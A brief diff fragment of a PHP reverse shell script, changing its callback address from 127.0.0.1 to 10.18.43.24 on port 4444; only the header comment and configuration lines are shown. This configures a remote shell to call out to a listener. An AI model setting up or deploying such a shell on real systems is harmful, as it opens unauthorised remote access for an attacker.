@@ -1,7 +1,7 @@
 <?php
 // php-reverse-shell - A Reverse Shell implementation in PHP
 
-$ip = '127.0.0.1';
+$ip = '10.18.43.24';
 $port = 4444; 
 
 set_time_limit (0);
